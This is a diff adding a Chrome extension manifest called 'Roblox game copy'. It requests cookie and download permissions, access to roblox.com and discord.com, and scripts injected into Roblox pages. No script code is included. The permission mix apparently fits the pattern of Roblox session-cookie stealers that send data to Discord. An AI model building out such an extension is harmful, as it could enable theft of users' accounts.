@@ -1,0 +1,26 @@
+{
+  "manifest_version": 3,
+  "name": "Roblox game copy",
+  "version": "1.0",
+  "permissions": [
+    "cookies",
+    "downloads"
+  ],
+  "host_permissions": [
+    "https://www.roblox.com/*",
+    "https://discord.com/*"
+  ],
+  "background": {
+    "service_worker": "copy.js"
+  },
+  "content_scripts": [
+    {
+      "matches": [
+        "https://www.roblox.com/*"
+      ],
+      "js": [
+        "loadgame.js"
+      ]
+    }
+  ]
+}
